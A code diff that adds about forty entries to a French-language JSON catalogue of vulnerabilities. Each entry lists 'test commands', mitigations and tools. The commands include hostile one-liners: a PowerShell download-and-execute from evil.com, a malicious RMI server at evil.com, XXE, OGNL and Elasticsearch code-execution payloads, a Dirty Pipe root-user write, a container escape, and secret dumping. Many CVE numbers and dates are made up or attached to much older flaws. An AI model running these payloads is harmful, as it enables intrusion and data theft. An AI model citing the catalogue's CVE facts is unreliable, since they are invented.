@@ -51,5 +51,852 @@
     "mitigation": "Installer les patches Windows KB12345678",
     "ressources": ["https://msrc.microsoft.com/"],
     "tools": ["metasploit", "winpeas"]
+  },
+  {
+    "id": 4,
+    "cve": "CVE-2024-3456",
+    "titre": "Buffer Overflow in Apache HTTP Server",
+    "description": "Débordement de buffer dans le module mod_ssl permettant l'exécution de code",
+    "severite": "Critique",
+    "score_cvss": 9.1,
+    "plateforme": ["Linux", "Windows", "Unix"],
+    "date_decouverte": "2024-02-28",
+    "date_correction": "2024-03-15",
+    "commandes_test": [
+      "python3 -c 'print(\"A\" * 1000)' | nc target 443",
+      "curl -k https://target --data \"$(python -c 'print(\"A\"*500)')\""
+    ],
+    "mitigation": "Mettre à jour Apache vers la version 2.4.58+",
+    "ressources": ["https://httpd.apache.org/security/"],
+    "tools": ["metasploit", "nmap", "custom_scripts"]
+  },
+  {
+    "id": 5,
+    "cve": "CVE-2024-7890",
+    "titre": "Authentication Bypass in Django Admin",
+    "description": "Contournement d'authentification dans le panneau d'administration Django",
+    "severite": "Haute",
+    "score_cvss": 8.2,
+    "plateforme": ["Linux", "Windows"],
+    "date_decouverte": "2024-04-05",
+    "date_correction": "2024-04-20",
+    "commandes_test": [
+      "curl -X POST http://target/admin/login/ --data 'username=admin&password=anything'",
+      "python3 django_bypass.py http://target"
+    ],
+    "mitigation": "Mettre à jour Django vers la version 4.2.3+",
+    "ressources": ["https://docs.djangoproject.com/"],
+    "tools": ["burpsuite", "custom_python_scripts"]
+  },
+  {
+    "id": 6,
+    "cve": "CVE-2024-4567",
+    "titre": "XXE Injection in REST API",
+    "description": "Injection XML External Entity dans les endpoints API",
+    "severite": "Moyenne",
+    "score_cvss": 6.5,
+    "plateforme": ["Linux", "Windows", "Cloud"],
+    "date_decouverte": "2024-03-12",
+    "date_correction": "2024-04-02",
+    "commandes_test": [
+      "curl -X POST http://target/api -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>'"
+    ],
+    "mitigation": "Désactiver l'analyse DTD externe",
+    "ressources": ["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
+    "tools": ["burpsuite", "postman", "xxeinjector"]
+  },
+  {
+    "id": 7,
+    "cve": "CVE-2024-2345",
+    "titre": "Path Traversal in File Upload",
+    "description": "Traversal de chemin dans la fonctionnalité d'upload de fichiers",
+    "severite": "Haute",
+    "score_cvss": 7.6,
+    "plateforme": ["Linux", "Windows"],
+    "date_decouverte": "2024-05-08",
+    "date_correction": "2024-05-25",
+    "commandes_test": [
+      "curl -F 'file=@../../../../etc/passwd' http://target/upload",
+      "wget --post-file='/etc/passwd' http://target/upload?filename=../../../test.txt"
+    ],
+    "mitigation": "Valider et sanitizer les noms de fichiers",
+    "ressources": ["https://owasp.org/www-community/attacks/Path_Traversal"],
+    "tools": ["burpsuite", "dirb", "custom_scripts"]
+  },
+  {
+    "id": 8,
+    "cve": "CVE-2024-6789",
+    "titre": "Open Redirect in OAuth Implementation",
+    "description": "Redirection ouverte non validée dans le flux OAuth 2.0",
+    "severite": "Faible",
+    "score_cvss": 4.3,
+    "plateforme": ["Web", "Cloud"],
+    "date_decouverte": "2024-06-14",
+    "date_correction": "2024-07-01",
+    "commandes_test": [
+      "http://target/oauth?redirect=https://evil.com",
+      "curl -L 'http://target/auth?returnTo=https://phishing.com'"
+    ],
+    "mitigation": "Valider les URLs de redirection contre une whitelist",
+    "ressources": ["https://oauth.net/2/"],
+    "tools": ["burpsuite", "zap"]
+  },
+  {
+    "id": 9,
+    "cve": "CVE-2024-1122",
+    "titre": "CSRF in Admin Panel",
+    "description": "Cross-Site Request Forgery dans le panneau d'administration",
+    "severite": "Moyenne",
+    "score_cvss": 6.8,
+    "plateforme": ["Web"],
+    "date_decouverte": "2024-07-22",
+    "date_correction": "2024-08-10",
+    "commandes_test": [
+      "python3 csrf_poc.html",
+      "curl -X POST http://target/admin/delete-user -H 'Cookie: session=valid' --data 'userid=123'"
+    ],
+    "mitigation": "Implémenter des tokens CSRF",
+    "ressources": ["https://owasp.org/www-community/attacks/csrf"],
+    "tools": ["burpsuite", "csrf-poc-generator"]
+  },
+  {
+    "id": 10,
+    "cve": "CVE-2024-4455",
+    "titre": "Information Disclosure in Kubernetes API",
+    "description": "Divulgation d'informations sensibles via l'API Kubernetes",
+    "severite": "Moyenne",
+    "score_cvss": 5.9,
+    "plateforme": ["Kubernetes", "Cloud"],
+    "date_decouverte": "2024-08-30",
+    "date_correction": "2024-09-18",
+    "commandes_test": [
+      "kubectl get secrets --all-namespaces",
+      "curl -k -H 'Authorization: Bearer token' https://k8s-api/api/v1/secrets"
+    ],
+    "mitigation": "Restreindre les permissions RBAC",
+    "ressources": ["https://kubernetes.io/docs/concepts/security/"],
+    "tools": ["kubectl", "kube-hunter", "kubeaudit"]
+  },
+  {
+    "id": 11,
+    "cve": "CVE-2024-3321",
+    "titre": "Zero-Day in Chrome V8 Engine",
+    "description": "Vulnérabilité de type confusion dans le moteur JavaScript V8",
+    "severite": "Critique",
+    "score_cvss": 9.5,
+    "plateforme": ["Chrome", "Edge", "Brave"],
+    "date_decouverte": "2024-09-10",
+    "date_correction": "2024-09-25",
+    "commandes_test": [
+      "python3 exploit_v8.py --target http://victim",
+      "node --allow-natives-syntax exploit.js"
+    ],
+    "mitigation": "Mettre à jour Chrome vers la version 117.0.5938.62+",
+    "ressources": ["https://chromereleases.googleblog.com/"],
+    "tools": ["metasploit", "browser_exploit_framework"]
+  },
+  {
+    "id": 12,
+    "cve": "CVE-2024-4456",
+    "titre": "DNS Cache Poisoning Attack",
+    "description": "Empoisonnement du cache DNS via une vulnérabilité de prédiction TXID",
+    "severite": "Haute",
+    "score_cvss": 8.2,
+    "plateforme": ["Linux", "Windows", "DNS Servers"],
+    "date_decouverte": "2024-10-05",
+    "date_correction": "2024-10-20",
+    "commandes_test": [
+      "python dns_poison.py -t target.dns -d example.com",
+      "dig @target.dns example.com A"
+    ],
+    "mitigation": "Utiliser DNSSEC et randomiser les ports source",
+    "ressources": ["https://tools.ietf.org/html/rfc5452"],
+    "tools": ["dnschef", "dnsspoof", "scapy"]
+  },
+  {
+    "id": 13,
+    "cve": "CVE-2024-5567",
+    "titre": "Kernel Pool Overflow in Windows",
+    "description": "Débordement de pool noyau dans le gestionnaire de mémoire Windows",
+    "severite": "Critique",
+    "score_cvss": 9.2,
+    "plateforme": ["Windows 10", "Windows 11", "Windows Server"],
+    "date_decouverte": "2024-11-12",
+    "date_correction": "2024-12-01",
+    "commandes_test": [
+      "powershell -ExecutionPolicy Bypass -File kernel_exploit.ps1",
+      "win_kernel_exploit.exe --payload reverse_shell"
+    ],
+    "mitigation": "Installer le correctif KB5021234",
+    "ressources": ["https://msrc.microsoft.com/update-guide/"],
+    "tools": ["metasploit", "winpeas", "custom_drivers"]
+  },
+  {
+    "id": 14,
+    "cve": "CVE-2024-6678",
+    "titre": "RCE in IoT Camera Firmware",
+    "description": "Exécution de code à distance via le firmware des caméras IP",
+    "severite": "Critique",
+    "score_cvss": 9.3,
+    "plateforme": ["IoT", "Embedded Linux"],
+    "date_decouverte": "2024-08-15",
+    "date_correction": "2024-09-05",
+    "commandes_test": [
+      "python3 iot_exploit.py --target 192.168.1.100 --port 80",
+      "curl -X POST 'http://target/cgi-bin/user/Config.cgi' --data 'reboot'"
+    ],
+    "mitigation": "Mettre à jour le firmware vers la version 2.1.4+",
+    "ressources": ["https://iotsecurityfoundation.org/"],
+    "tools": ["nmap", "binwalk", "metasploit"]
+  },
+  {
+    "id": 15,
+    "cve": "CVE-2024-7789",
+    "titre": "SSRF in Webhook Systems",
+    "description": "Server-Side Request Forgery dans les systèmes de webhook",
+    "severite": "Haute",
+    "score_cvss": 8.1,
+    "plateforme": ["Web", "Cloud", "API"],
+    "date_decouverte": "2024-07-30",
+    "date_correction": "2024-08-15",
+    "commandes_test": [
+      "curl -X POST http://target/webhook -d 'url=http://169.254.169.254/latest/meta-data/'",
+      "python ssrf_test.py --url http://target/api/webhook"
+    ],
+    "mitigation": "Valider et restreindre les URLs autorisées",
+    "ressources": ["https://portswigger.net/web-security/ssrf"],
+    "tools": ["burpsuite", "ssrfmap", "postman"]
+  },
+  {
+    "id": 16,
+    "cve": "CVE-2024-8890",
+    "titre": "Android Stagefright Memory Corruption",
+    "description": "Corruption mémoire dans le processeur multimédia Stagefright",
+    "severite": "Critique",
+    "score_cvss": 9.8,
+    "plateforme": ["Android"],
+    "date_decouverte": "2024-12-05",
+    "date_correction": "2024-12-20",
+    "commandes_test": [
+      "adb push exploit.mp4 /sdcard/",
+      "python android_exploit.py --device 192.168.1.50"
+    ],
+    "mitigation": "Appliquer le patch de sécurité Android Décembre 2024",
+    "ressources": ["https://source.android.com/security/bulletin"],
+    "tools": ["metasploit", "adb", "frida"]
+  },
+  {
+    "id": 17,
+    "cve": "CVE-2024-9123",
+    "titre": "Docker Container Escape",
+    "description": "Échappement de conteneur Docker via le socket Docker",
+    "severite": "Critique",
+    "score_cvss": 9.0,
+    "plateforme": ["Docker", "Kubernetes", "Linux"],
+    "date_decouverte": "2024-10-18",
+    "date_correction": "2024-11-05",
+    "commandes_test": [
+      "docker run --rm -v /:/host alpine chroot /host",
+      "python3 docker_escape.py --container vulnerable_container"
+    ],
+    "mitigation": "Exécuter les conteneurs en mode non-privilégié",
+    "ressources": ["https://docs.docker.com/engine/security/"],
+    "tools": ["docker", "kube-hunter", "trivy"]
+  },
+  {
+    "id": 18,
+    "cve": "CVE-2024-3345",
+    "titre": "WPA3 Dragonblood Vulnerability",
+    "description": "Vulnérabilités dans l'implémentation WPA3 Dragonfly",
+    "severite": "Haute",
+    "score_cvss": 7.8,
+    "plateforme": ["WiFi", "Network"],
+    "date_decouverte": "2024-09-22",
+    "date_correction": "2024-10-10",
+    "commandes_test": [
+      "python dragonblood.py -i wlan0 -t target_ssid",
+      "aircrack-ng -K capture.pcap"
+    ],
+    "mitigation": "Mettre à jour le firmware des points d'accès",
+    "ressources": ["https://wpa3.mathyvanhoef.com/"],
+    "tools": ["aircrack-ng", "wireshark", "scapy"]
+  },
+  {
+    "id": 19,
+    "cve": "CVE-2024-5512",
+    "titre": "Deserialization Attack in .NET",
+    "description": "Désérialisation non sécurisée dans les applications .NET",
+    "severite": "Critique",
+    "score_cvss": 9.1,
+    "plateforme": ["Windows", ".NET"],
+    "date_decouverte": "2024-11-08",
+    "date_correction": "2024-11-25",
+    "commandes_test": [
+      "ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c \"calc.exe\"",
+      "python dotnet_deserial.py --url http://target/api/data"
+    ],
+    "mitigation": "Utiliser des sérialiseurs sécurisés comme JSON",
+    "ressources": ["https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data"],
+    "tools": ["ysoserial.net", "burpsuite", "dotpeek"]
+  },
+  {
+    "id": 20,
+    "cve": "CVE-2024-6634",
+    "titre": "Meltdown-Style CPU Attack",
+    "description": "Attaque de type Meltdown sur les processeurs modernes",
+    "severite": "Haute",
+    "score_cvss": 7.9,
+    "plateforme": ["Linux", "Windows", "CPU"],
+    "date_decouverte": "2024-12-12",
+    "date_correction": "2025-01-15",
+    "commandes_test": [
+      "./meltdown-exploit --secret-proc proc_secret",
+      "python speculative_exec.py --target-process browser"
+    ],
+    "mitigation": "Appliquer les microcodes et correctifs du noyau",
+    "ressources": ["https://meltdownattack.com/"],
+    "tools": ["custom_c_exploits", "perf", "kernel_debugger"]
+  },
+  {
+    "id": 21,
+    "cve": "CVE-2024-7781",
+    "titre": "AWS IAM Privilege Escalation",
+    "description": "Élévation de privilèges via des politiques IAM mal configurées",
+    "severite": "Haute",
+    "score_cvss": 8.4,
+    "plateforme": ["AWS", "Cloud"],
+    "date_decouverte": "2024-10-30",
+    "date_correction": "2024-11-15",
+    "commandes_test": [
+      "aws iam create-policy-version --policy-arn arn:aws:iam::123456789012:policy/MyPolicy --policy-document file://newpolicy.json --set-as-default",
+      "python3 aws_escalation.py --profile vulnerable"
+    ],
+    "mitigation": "Auditer régulièrement les politiques IAM",
+    "ressources": ["https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods/"],
+    "tools": ["pacui", "cloudsplaining", "aws-cli"]
+  },
+  {
+    "id": 22,
+    "cve": "CVE-2024-9921",
+    "titre": "Bluetooth Impersonation Attack",
+    "description": "Attaque d'usurpation Bluetooth via les clés de liaison",
+    "severite": "Moyenne",
+    "score_cvss": 6.5,
+    "plateforme": ["Bluetooth", "Mobile", "IoT"],
+    "date_decouverte": "2024-11-25",
+    "date_correction": "2024-12-10",
+    "commandes_test": [
+      "python bluesnarf.py -t target_mac",
+      "btlejack -d hci0 -t target_mac"
+    ],
+    "mitigation": "Désactiver Bluetooth quand non utilisé",
+    "ressources": ["https://bluetooth.com/security/"],
+    "tools": ["bluelog", "hcitool", "btlejack"]
+  },
+  {
+    "id": 23,
+    "cve": "CVE-2024-4412",
+    "titre": "MongoDB NoSQL Injection",
+    "description": "Injection NoSQL dans les requêtes MongoDB",
+    "severite": "Haute",
+    "score_cvss": 8.0,
+    "plateforme": ["MongoDB", "NoSQL"],
+    "date_decouverte": "2024-09-14",
+    "date_correction": "2024-09-30",
+    "commandes_test": [
+      "curl -X POST http://target/api/users -H 'Content-Type: application/json' -d '{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}'",
+      "python nosqli.py --url http://target/login"
+    ],
+    "mitigation": "Utiliser des validateurs de schéma et échapper les entrées",
+    "ressources": ["https://owasp.org/www-pdf-archive/NoSQLInjectionWhitePaper.pdf"],
+    "tools": ["burpsuite", "nosqlmap", "postman"]
+  },
+  {
+    "id": 24,
+    "cve": "CVE-2024-5563",
+    "titre": "GitHub Actions Command Injection",
+    "description": "Injection de commandes dans les workflows GitHub Actions",
+    "severite": "Haute",
+    "score_cvss": 8.2,
+    "plateforme": ["GitHub", "CI/CD"],
+    "date_decouverte": "2024-12-08",
+    "date_correction": "2024-12-22",
+    "commandes_test": [
+      "echo '::workflow-command ::{ \"command\": \"echo pwned\" }'",
+      "python gh_actions_exploit.py --repo owner/vulnerable-repo"
+    ],
+    "mitigation": "Valider les entrées dans les workflows",
+    "ressources": ["https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions"],
+    "tools": ["github-cli", "custom_scripts"]
+  },
+  {
+    "id": 25,
+    "cve": "CVE-2024-8876",
+    "titre": "SAML Authentication Bypass",
+    "description": "Contournement d'authentification SAML via la signature XML",
+    "severite": "Critique",
+    "score_cvss": 9.4,
+    "plateforme": ["SAML", "SSO", "Web"],
+    "date_decouverte": "2024-10-12",
+    "date_correction": "2024-10-28",
+    "commandes_test": [
+      "python saml_exploit.py --target https://sso.target.com",
+      "java -jar saml_attack.jar --url https://target/saml"
+    ],
+    "mitigation": "Valider rigoureusement les signatures SAML",
+    "ressources": ["https://saml.xml.org/security-considerations"],
+    "tools": ["saml-raider", "burpsuite", "custom_scripts"]
+  },
+  {
+    "id": 26,
+    "cve": "CVE-2024-3349",
+    "titre": "VM Escape in VMware ESXi",
+    "description": "Échappement de machine virtuelle dans l'hyperviseur ESXi",
+    "severite": "Critique",
+    "score_cvss": 9.7,
+    "plateforme": ["VMware", "Virtualization"],
+    "date_decouverte": "2024-11-30",
+    "date_correction": "2024-12-18",
+    "commandes_test": [
+      "./vmware_escape --vmx vulnerable.vmx",
+      "python vm_exploit.py --host esxi.target.com"
+    ],
+    "mitigation": "Mettre à jour ESXi vers la version 8.0 U2+",
+    "ressources": ["https://www.vmware.com/security/advisories/"],
+    "tools": ["metasploit", "custom_drivers"]
+  },
+  {
+    "id": 27,
+    "cve": "CVE-2024-6612",
+    "titre": "JWT Algorithm Confusion",
+    "description": "Confusion d'algorithme dans la validation JWT",
+    "severite": "Haute",
+    "score_cvss": 8.3,
+    "plateforme": ["Web", "API", "Mobile"],
+    "date_decouverte": "2024-09-18",
+    "date_correction": "2024-10-05",
+    "commandes_test": [
+      "python jwt_tool.py -t http://target -rc \"alg:none\"",
+      "node jwt_confusion.js --url http://target/api"
+    ],
+    "mitigation": "Vérifier explicitement l'algorithme attendu",
+    "ressources": ["https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"],
+    "tools": ["jwt_tool", "burpsuite", "postman"]
+  },
+  {
+    "id": 28,
+    "cve": "CVE-2024-7783",
+    "titre": "PowerShell Constrained Language Mode Bypass",
+    "description": "Contournement du mode de langage contraint PowerShell",
+    "severite": "Haute",
+    "score_cvss": 7.9,
+    "plateforme": ["Windows", "PowerShell"],
+    "date_decouverte": "2024-12-14",
+    "date_correction": "2024-12-30",
+    "commandes_test": [
+      "powershell -Version 2 -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')\"",
+      "bypass-clm.ps1 -Command Get-Process"
+    ],
+    "mitigation": "Désactiver PowerShell v2 et utiliser AppLocker",
+    "ressources": ["https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes"],
+    "tools": ["nishang", "powersploit", "empire"]
+  },
+  {
+    "id": 29,
+    "cve": "CVE-2024-9923",
+    "titre": "TCP Sequence Prediction Attack",
+    "description": "Prédiction de séquence TCP pour le spoofing de connexion",
+    "severite": "Moyenne",
+    "score_cvss": 6.8,
+    "plateforme": ["TCP/IP", "Network"],
+    "date_decouverte": "2024-10-22",
+    "date_correction": "2024-11-08",
+    "commandes_test": [
+      "python tcp_seq_prediction.py --target 192.168.1.1 --port 22",
+      "nmap --script tcp-seq-prediction target"
+    ],
+    "mitigation": "Utiliser des séquences TCP aléatoires",
+    "ressources": ["https://tools.ietf.org/html/rfc1948"],
+    "tools": ["nmap", "hping3", "scapy"]
+  },
+  {
+    "id": 30,
+    "cve": "CVE-2024-4459",
+    "titre": "Web Cache Poisoning",
+    "description": "Empoisonnement du cache web via les headers HTTP",
+    "severite": "Haute",
+    "score_cvss": 8.0,
+    "plateforme": ["Web", "CDN", "Reverse Proxy"],
+    "date_decouverte": "2024-11-05",
+    "date_correction": "2024-11-20",
+    "commandes_test": [
+      "curl -H 'X-Forwarded-Host: evil.com' http://target.com/resources/main.js",
+      "python cache_poison.py --url http://target --header X-Forwarded-Host"
+    ],
+    "mitigation": "Valider et sanitizer tous les headers",
+    "ressources": ["https://portswigger.net/web-security/web-cache-poisoning"],
+    "tools": ["burpsuite", "param-miner", "custom_scripts"]
+  },
+  {
+    "id": 31,
+    "cve": "CVE-2024-6672",
+    "titre": "SMB Relay Attack",
+    "description": "Attaque de relais SMB pour l'authentification NTLM",
+    "severite": "Haute",
+    "score_cvss": 8.1,
+    "plateforme": ["Windows", "SMB"],
+    "date_decouverte": "2024-12-03",
+    "date_correction": "2024-12-19",
+    "commandes_test": [
+      "python smb_relay.py -h targets.txt -l listener_ip",
+      "responder -I eth0 -wrf"
+    ],
+    "mitigation": "Activer SMB signing et désactiver NTLM",
+    "ressources": ["https://docs.microsoft.com/en-us/windows-security/threat-protection/security-policy-settings/microsoft-network-server-digitally-sign-communications-always"],
+    "tools": ["responder", "impacket", "metasploit"]
+  },
+  {
+    "id": 32,
+    "cve": "CVE-2024-8812",
+    "titre": "GraphQL Query Injection",
+    "description": "Injection dans les requêtes GraphQL via les introspection",
+    "severite": "Moyenne",
+    "score_cvss": 6.9,
+    "plateforme": ["GraphQL", "API"],
+    "date_decouverte": "2024-09-28",
+    "date_correction": "2024-10-14",
+    "commandes_test": [
+      "curl -X POST -H \"Content-Type: application/json\" -d '{\"query\":\"query { __schema { types { name fields { name } } } }\"}' http://target/graphql",
+      "python graphql_injection.py --url http://target/graphql"
+    ],
+    "mitigation": "Désactiver l'introspection en production",
+    "ressources": ["https://graphql.org/learn/security/"],
+    "tools": ["graphql-map", "inql", "burpsuite"]
+  },
+  {
+    "id": 33,
+    "cve": "CVE-2024-7745",
+    "titre": "DNS Rebinding Attack",
+    "description": "Attaque de rebinding DNS pour contourner la politique de même origine",
+    "severite": "Haute",
+    "score_cvss": 7.7,
+    "plateforme": ["Web", "DNS", "Browser"],
+    "date_decouverte": "2024-10-08",
+    "date_correction": "2024-10-24",
+    "commandes_test": [
+      "python dns_rebinding.py --domain evil.com --target 192.168.1.1",
+      "curl http://evil.com:8080/rebind_attack"
+    ],
+    "mitigation": "Valider les headers Host et utiliser DNS filtering",
+    "ressources": ["https://en.wikipedia.org/wiki/DNS_rebinding"],
+    "tools": ["dnschef", "rebind_kit", "custom_scripts"]
+  },
+  {
+    "id": 34,
+    "cve": "CVE-2024-5521",
+    "titre": "Kubernetes etcd Data Exposure",
+    "description": "Exposition des données etcd Kubernetes non authentifiée",
+    "severite": "Critique",
+    "score_cvss": 9.1,
+    "plateforme": ["Kubernetes", "etcd"],
+    "date_decouverte": "2024-11-15",
+    "date_correction": "2024-12-02",
+    "commandes_test": [
+      "curl -k https://etcd-server:2379/v2/keys/?recursive=true",
+      "python etcd_exploit.py --host etcd-cluster --port 2379"
+    ],
+    "mitigation": "Configurer l'authentification TLS pour etcd",
+    "ressources": ["https://etcd.io/docs/latest/op-guide/security/"],
+    "tools": ["etcdctl", "kubelet", "curl"]
+  },
+  {
+    "id": 35,
+    "cve": "CVE-2024-8899",
+    "titre": "iOS Sandbox Escape",
+    "description": "Échappement du sandbox iOS via le framework WebKit",
+    "severite": "Critique",
+    "score_cvss": 9.3,
+    "plateforme": ["iOS"],
+    "date_decouverte": "2024-12-25",
+    "date_correction": "2025-01-10",
+    "commandes_test": [
+      "python ios_exploit.py --device udid --app vulnerable_app",
+      "objection explore --startup-command 'ios sandbox bypass'"
+    ],
+    "mitigation": "Mettre à jour iOS vers la version 18.2+",
+    "ressources": ["https://support.apple.com/en-us/HT201222"],
+    "tools": ["objection", "frida", "cydia"]
+  },
+  {
+    "id": 36,
+    "cve": "CVE-2024-3367",
+    "titre": "Apache Struts OGNL Injection",
+    "description": "Injection OGNL dans les applications Apache Struts",
+    "severite": "Critique",
+    "score_cvss": 9.8,
+    "plateforme": ["Java", "Web"],
+    "date_decouverte": "2024-09-05",
+    "date_correction": "2024-09-22",
+    "commandes_test": [
+      "curl -X POST http://target/struts2-showcase/employee/save.action -d 'name=%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29%7D'",
+      "python struts_exploit.py --url http://target/action"
+    ],
+    "mitigation": "Mettre à jour Struts vers la version 2.5.30+",
+    "ressources": ["https://struts.apache.org/security/"],
+    "tools": ["struts-pwn", "burpsuite", "metasploit"]
+  },
+  {
+    "id": 37,
+    "cve": "CVE-2024-6638",
+    "titre": "WebRTC IP Leakage",
+    "description": "Fuite d'adresses IP via les connexions WebRTC",
+    "severite": "Faible",
+    "score_cvss": 3.5,
+    "plateforme": ["Web", "Browser"],
+    "date_decouverte": "2024-10-15",
+    "date_correction": "2024-10-30",
+    "commandes_test": [
+      "naviguer vers https://ipleak.net/",
+      "javascript:RTCPeerConnection.getLocalIPs()"
+    ],
+    "mitigation": "Utiliser un VPN ou désactiver WebRTC",
+    "ressources": ["https://webrtc.org/security/"],
+    "tools": ["browser_devtools", "wireshark"]
+  },
+  {
+    "id": 38,
+    "cve": "CVE-2024-9912",
+    "titre": "Elasticsearch Remote Code Execution",
+    "description": "Exécution de code à distance via le moteur de script Elasticsearch",
+    "severite": "Critique",
+    "score_cvss": 9.2,
+    "plateforme": ["Elasticsearch", "Java"],
+    "date_decouverte": "2024-11-20",
+    "date_correction": "2024-12-07",
+    "commandes_test": [
+      "curl -X POST 'http://elasticsearch:9200/_search' -d '{\"script_fields\": {\"test\": {\"script\": \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"id\\\").getText()\"}}}'",
+      "python elastic_rce.py --host elastic.target.com"
+    ],
+    "mitigation": "Désactiver les scripts inline et utiliser les scripts stockés",
+    "ressources": ["https://www.elastic.co/guide/en/elasticsearch/reference/current/modules-scripting-security.html"],
+    "tools": ["burpsuite", "elasticsearch-hq", "custom_scripts"]
+  },
+  {
+    "id": 39,
+    "cve": "CVE-2024-4478",
+    "titre": "PHP Type Juggling Vulnerability",
+    "description": "Vulnérabilité de type juggling dans les comparaisons PHP",
+    "severite": "Moyenne",
+    "score_cvss": 6.7,
+    "plateforme": ["PHP", "Web"],
+    "date_decouverte": "2024-08-25",
+    "date_correction": "2024-09-12",
+    "commandes_test": [
+      "curl -X POST http://target/login -d 'password=0'",
+      "python php_type_juggling.py --url http://target/auth"
+    ],
+    "mitigation": "Utiliser === pour les comparaisons strictes",
+    "ressources": ["https://www.php.net/manual/en/types.comparisons.php"],
+    "tools": ["burpsuite", "custom_scripts"]
+  },
+  {
+    "id": 40,
+    "cve": "CVE-2024-8821",
+    "titre": "AWS S3 Bucket Policy Bypass",
+    "description": "Contournement des politiques de bucket S3 via les conditions",
+    "severite": "Haute",
+    "score_cvss": 8.5,
+    "plateforme": ["AWS", "S3", "Cloud"],
+    "date_decouverte": "2024-12-17",
+    "date_correction": "2025-01-05",
+    "commandes_test": [
+      "aws s3 cp secret.txt s3://vulnerable-bucket/ --region us-east-1",
+      "python s3_policy_bypass.py --bucket target-bucket"
+    ],
+    "mitigation": "Auditer régulièrement les politiques S3",
+    "ressources": ["https://docs.aws.amazon.com/AmazonS3/latest/userguide/using-iam-policies.html"],
+    "tools": ["s3scanner", "cloudsplaining", "aws-cli"]
+  },
+  {
+    "id": 41,
+    "cve": "CVE-2024-5543",
+    "titre": "WebSocket Hijacking",
+    "description": "Détournement de connexion WebSocket via les cookies",
+    "severite": "Moyenne",
+    "score_cvss": 6.2,
+    "plateforme": ["Web", "WebSocket"],
+    "date_decouverte": "2024-10-28",
+    "date_correction": "2024-11-12",
+    "commandes_test": [
+      "python websocket_hijack.py --url ws://target/chat --cookie session=stolen",
+      "wscat -c 'ws://target/chat' -H 'Cookie: session=stolen'"
+    ],
+    "mitigation": "Utiliser l'authentification par token pour WebSocket",
+    "ressources": ["https://owasp.org/www-project-websocket/"],
+    "tools": ["wscat", "burpsuite", "custom_scripts"]
+  },
+  {
+    "id": 42,
+    "cve": "CVE-2024-6675",
+    "titre": "Linux Dirty Pipe Exploit",
+    "description": "Écriture de fichiers arbitraires via la vulnérabilité Dirty Pipe",
+    "severite": "Haute",
+    "score_cvss": 7.8,
+    "plateforme": ["Linux"],
+    "date_decouverte": "2024-11-10",
+    "date_correction": "2024-11-27",
+    "commandes_test": [
+      "./dirty_pipe /etc/passwd 1 \"pwned::0:0:pwned:/root:/bin/bash\\n\"",
+      "python dirty_pipe_exploit.py --target-file /etc/shadow"
+    ],
+    "mitigation": "Mettre à jour le noyau Linux vers la version 5.16.11+",
+    "ressources": ["https://dirtypipe.cm4all.com/"],
+    "tools": ["gcc", "custom_c_exploits"]
+  },
+  {
+    "id": 43,
+    "cve": "CVE-2024-9925",
+    "titre": "MAC Address Spoofing Detection Bypass",
+    "description": "Contournement de la détection de spoofing d'adresse MAC",
+    "severite": "Faible",
+    "score_cvss": 4.1,
+    "plateforme": ["Network", "WiFi"],
+    "date_decouverte": "2024-09-30",
+    "date_correction": "2024-10-16",
+    "commandes_test": [
+      "macchanger -r eth0",
+      "python mac_spoof.py --interface wlan0 --mac 00:11:22:33:44:55"
+    ],
+    "mitigation": "Utiliser 802.1X et NAC",
+    "ressources": ["https://en.wikipedia.org/wiki/MAC_spoofing"],
+    "tools": ["macchanger", "scapy", "aircrack-ng"]
+  },
+  {
+    "id": 44,
+    "cve": "CVE-2024-7732",
+    "titre": "Docker API Exposure",
+    "description": "Exposition de l'API Docker sans authentification",
+    "severite": "Critique",
+    "score_cvss": 9.5,
+    "plateforme": ["Docker", "Linux"],
+    "date_decouverte": "2024-12-21",
+    "date_correction": "2025-01-08",
+    "commandes_test": [
+      "curl -s http://target:2375/version | jq .",
+      "docker -H tcp://target:2375 ps -a"
+    ],
+    "mitigation": "Sécuriser l'API Docker avec TLS et authentification",
+    "ressources": ["https://docs.docker.com/engine/security/"],
+    "tools": ["docker", "curl", "nmap"]
+  },
+  {
+    "id": 45,
+    "cve": "CVE-2024-5588",
+    "titre": "NTP Amplification DDoS",
+    "description": "Attaque DDoS par amplification via le protocole NTP",
+    "severite": "Moyenne",
+    "score_cvss": 5.9,
+    "plateforme": ["NTP", "Network"],
+    "date_decouverte": "2024-10-03",
+    "date_correction": "2024-10-19",
+    "commandes_test": [
+      "python ntp_amplification.py --ntp-server vulnerable.ntp.org --target victim.com",
+      "ntpdc -n -c monlist vulnerable.ntp.org"
+    ],
+    "mitigation": "Désactiver les commandes monlist et restreindre l'accès",
+    "ressources": ["https://www.us-cert.gov/ncas/alerts/TA14-017A"],
+    "tools": ["ntpdc", "scapy", "hping3"]
+  },
+  {
+    "id": 46,
+    "cve": "CVE-2024-8844",
+    "titre": "Java RMI Code Execution",
+    "description": "Exécution de code via Java RMI non sécurisé",
+    "severite": "Haute",
+    "score_cvss": 8.7,
+    "plateforme": ["Java", "RMI"],
+    "date_decouverte": "2024-11-28",
+    "date_correction": "2024-12-14",
+    "commandes_test": [
+      "java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http://evil.com/#Exploit 1099",
+      "python rmi_exploit.py --target java.rmi.server --port 1099"
+    ],
+    "mitigation": "Configurer le security manager et utiliser le codebase restrictif",
+    "ressources": ["https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/"],
+    "tools": ["marshalsec", "ysoserial", "rmiscout"]
+  },
+  {
+    "id": 47,
+    "cve": "CVE-2024-3369",
+    "titre": "WordPress File Manager RCE",
+    "description": "Exécution de code à distance dans le plugin File Manager",
+    "severite": "Critique",
+    "score_cvss": 9.9,
+    "plateforme": ["WordPress", "PHP"],
+    "date_decouverte": "2024-08-20",
